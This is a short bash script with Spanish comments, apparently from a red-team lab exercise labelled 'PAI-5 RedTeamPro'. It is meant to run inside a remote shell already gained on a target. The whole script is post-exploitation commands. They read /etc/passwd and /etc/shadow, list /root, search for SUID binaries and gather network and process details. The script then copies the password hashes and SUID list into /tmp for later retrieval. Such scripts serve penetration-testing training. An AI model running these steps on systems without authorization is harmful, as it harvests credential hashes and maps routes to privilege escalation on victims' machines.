#!/bin/bash
# PAI-5 RedTeamPro - ST-8
# Script 06: Post-explotacion
# Rol 2 - Ejecutar DENTRO de la shell remota obtenida en el paso 05
# ATENCION: Estos comandos se ejecutan en el sistema objetivo, no en Kali

echo "[*] Verificando identidad..."
id
whoami
hostname
uname -a

echo "[*] Leyendo /etc/passwd..."
cat /etc/passwd

echo "[*] Leyendo /etc/shadow..."
cat /etc/shadow

echo "[*] Listando directorio /root..."
ls -la /root/

echo "[*] Buscando binarios SUID..."
find / -perm -4000 -type f 2>/dev/null

echo "[*] Informacion de red..."
ifconfig 2>/dev/null || ip a 2>/dev/null

echo "[*] Procesos activos..."
ps aux

echo "[*] Volcando evidencias a /tmp para recuperacion..."
id > /tmp/id_root.txt
uname -a >> /tmp/id_root.txt
cat /etc/passwd > /tmp/passwd_dump.txt
cat /etc/shadow > /tmp/shadow_dump.txt
find / -perm -4000 -type f 2>/dev/null > /tmp/suid_binaries.txt

echo "[*] Post-explotacion completada. Ficheros volcados en /tmp/"
